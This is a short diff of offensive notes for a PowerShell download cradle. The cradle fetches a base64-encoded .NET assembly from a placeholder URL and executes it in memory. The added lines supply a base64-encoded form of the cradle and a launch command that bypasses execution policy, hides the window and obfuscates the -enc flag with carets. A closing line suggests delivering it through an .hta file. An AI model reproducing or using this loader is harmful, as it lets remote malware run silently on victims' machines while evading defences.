@@ -1,1 +1,8 @@
 [AppDomain]::CurrentDomain.Load([Convert]::Frombase64String((New-Object System.Net.WebClient).Downloadstring('URL'))).EntryPoint.invoke($null,$null)
+
+Base64 - W0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uTG9hZChbQ29udmVydF06OkZyb21iYXNlNjRTdHJpbmcoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2Fkc3RyaW5nKCdVUkwnKSkpLkVudHJ5UG9pbnQuaW52b2tlKCRudWxsLCRudWxsKQ==
+
+call via cmd or run -
+powershell.exe -ep bypass -noni -w hidden –^e^C^ W0FwcERvbWFpbl06OkN1cnJlbnREb21haW4uTG9hZChbQ29udmVydF06OkZyb21iYXNlNjRTdHJpbmcoKE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQpLkRvd25sb2Fkc3RyaW5nKCdVUkwnKSkpLkVudHJ5UG9pbnQuaW52b2tlKCRudWxsLCRudWxsKQ==
+
+Use .hta to invoke
